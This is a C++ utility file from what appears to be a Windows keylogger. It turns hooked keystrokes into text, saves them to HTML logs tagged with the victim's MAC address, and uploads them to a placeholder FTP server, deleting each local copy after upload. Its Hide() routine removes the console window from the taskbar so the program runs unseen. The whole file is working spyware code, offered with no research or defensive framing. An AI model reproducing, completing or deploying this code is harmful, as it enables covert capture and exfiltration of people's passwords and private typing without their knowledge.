#include "Utils.h"

void UtilFuncs::VKCodetoString(PKBDLLHOOKSTRUCT keyInfo, std::string& str) {
	char tmp[0xFF] = {0};
	DWORD msg = 1;

	if (keyInfo->vkCode == 161) {
		str = std::string("SHIFT");
		return;
	}

	msg += (keyInfo->scanCode << 16);
	msg += (keyInfo->flags << 24);
	msg += (1 << 25);
	GetKeyNameText(msg, tmp, 0xFF);
	str = std::string(tmp);
}

void UtilFuncs::treatShiftCases(std::string& str) {
	if (str[0] == '0') { str[0] = ')'; }
	else if (str[0] == '1') str[0] = '!';
	else if (str[0] == '2') str[0] = '@';
	else if (str[0] == '3') str[0] = '#';
	else if (str[0] == '4') str[0] = '$';
	else if (str[0] == '5') str[0] = '%';
	else if (str[0] == '6') str[0] = '^';
	else if (str[0] == '7') str[0] = '&';
	else if (str[0] == '8') str[0] = '*';
	else if (str[0] == '9') str[0] = '(';
	else if (str[0] == '-') str[0] = '_';
	else if (str[0] == '=') str[0] = '+';
	else if (str[0] == '[') str[0] = '{';
	else if (str[0] == ']') str[0] = '}';
	else if (str[0] == '\\') str[0] = '|';
	else if (str[0] == ';') str[0] = ':';
	else if (str[0] == ',') str[0] = '<';
	else if (str[0] == '.') str[0] = '>';
	else if (str[0] == '/') str[0] = '?';
	else if (str[0] == '\'') str[0] = '"';
	else if (str[0] == '`') str[0] = '~';
}

void UtilFuncs::treatNumpadCases(std::string& str) {
	if (str == "NUM DIVIDE") {
		str = "/";
	} else if (str == "NUMMULT") {
		str = "*";
	} else if (str == "NUM SUB") {
		str = "-";
	} else if (str == "NUM PLUS") {
		str = "+";
	} else if (str == "NUM ENTER") {
		str = "ENTER";
	} else if (str == "NUM DECIMAL") {
		str = ".";
	} else if (str == "NUM 0") {
		str = "0";
	} else if (str == "NUM 1") {
		str = "1";
	} else if (str == "NUM 2") {
		str = "2";
	} else if (str == "NUM 3") {
		str = "3";
	} else if (str == "NUM 4") {
		str = "4";
	} else if (str == "NUM 5") {
		str = "5";
	} else if (str == "NUM 6") {
		str = "6";
	} else if (str == "NUM 7") {
		str = "7";
	} else if (str == "NUM 8") {
		str = "8";
	} else if (str == "NUM 9") {
		str = "9";
	}
}

void UtilFuncs::writeLogToFile(NewMap loggedKeysMap) {
	std::ofstream logFile;
	std::chrono::milliseconds timeStamp = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now().time_since_epoch());
	std::string logName(macAddress);
	logName.append("_");
	logName.append(std::to_string(timeStamp.count()));
	logName.append(".html");
	logFile.open (logName);
	logFile << "<html>\n<title>";
	logFile << std::to_string(timeStamp.count());
	logFile << "</title>\n<body>\n";
	for (NewMap::const_iterator It = loggedKeysMap.begin(); It != loggedKeysMap.end(); ++It) {
		logFile << "<h1 style=\"color:blue;font-size:20px\">";
		logFile << (*It).first;
		logFile << "</h1>";
		logFile << (*It).second;
		logFile << "\n\n";
	}
	logFile << "\n</body>\n</html>";
	logFile.close();

	logsToSend.push_back(logName);
	sendToFTPServer();
}

void UtilFuncs::sendToFTPServer() {
	HINTERNET hInternet;
    HINTERNET hFtp;
	std::string curLogName;

	if(InternetCheckConnection("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {

		hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL,NULL,0);
		hFtp = InternetConnect(hInternet, "FTP_SERVER", INTERNET_DEFAULT_FTP_PORT, "USERNAME", "PASSWORD", INTERNET_SERVICE_FTP, 0, 0);

		int currentDirSize = GetCurrentDirectory(0,0); // determine size needed
		char *currentDir = (char*)malloc(currentDirSize);
		GetCurrentDirectory(currentDirSize, currentDir);

		while (!logsToSend.empty()) {
			curLogName = logsToSend.back();
			std::string logPath(currentDir);
			std::string ftpLogPath(macAddress);
			ftpLogPath.append("\\");
			ftpLogPath.append(curLogName);
			logPath.append("\\");
			logPath.append(curLogName);
			FtpCreateDirectory(hFtp, macAddress.c_str());
			if (FtpPutFile(hFtp, logPath.c_str(), ftpLogPath.c_str(), FTP_TRANSFER_TYPE_BINARY, 0)) {
				std::remove(logPath.c_str());
				logsToSend.pop_back();
			}
		}

		InternetCloseHandle(hFtp);
		InternetCloseHandle(hInternet);
	}
}

void UtilFuncs::getMacAddress() {
	IP_ADAPTER_INFO *info = NULL;
    DWORD size = 0;
	char tmpMacAddress[30];

	macAddress.clear();

	GetAdaptersInfo(info, &size);

    info = (IP_ADAPTER_INFO *)malloc(size);

    GetAdaptersInfo(info, &size);

	if (info != NULL) {
		for (int i=1; i < info->AddressLength; i++) {
			sprintf(tmpMacAddress, "%2.2x", info->Address[i]);
			macAddress.append(tmpMacAddress);
		}
		macAddress.erase(0,1);
	} else {
		macAddress.assign("IDUNNO");
	}

    free(info);
}

void UtilFuncs::Hide() {
	ITaskbarList *pTaskList = NULL;
	HRESULT initRet = CoInitialize(NULL);
	HRESULT createRet = CoCreateInstance( CLSID_TaskbarList,
		NULL,
        CLSCTX_INPROC_SERVER,
        IID_ITaskbarList,
        (LPVOID*)&pTaskList);

	if(createRet == S_OK) {
		pTaskList->DeleteTab(GetConsoleWindow());
		pTaskList->Release();
	}

	CoUninitialize();
}